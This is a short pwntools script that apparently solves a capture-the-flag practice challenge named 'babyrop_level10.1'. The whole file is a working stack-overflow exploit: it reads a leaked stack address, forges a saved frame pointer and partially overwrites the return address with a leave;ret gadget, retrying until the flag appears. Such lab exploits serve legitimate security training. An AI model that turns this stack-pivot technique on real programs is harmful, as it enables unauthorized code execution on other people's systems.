from pwn import *
while True:
    p = process("/challenge/babyrop_level10.1")

    leave_ret = 0x14AE 
    p.recvuntil("located at: ")
    leak = int(p.recvuntil(".")[:-1], 16)
    fake_rbp = leak - 0x10
    buf = b"A" * 0x78

    payload = buf + p64(fake_rbp) + p16(leave_ret)
    p.send(payload)
    all = p.recvall()
    if b"pwn" in all:
        print(all)
        break
    p.close()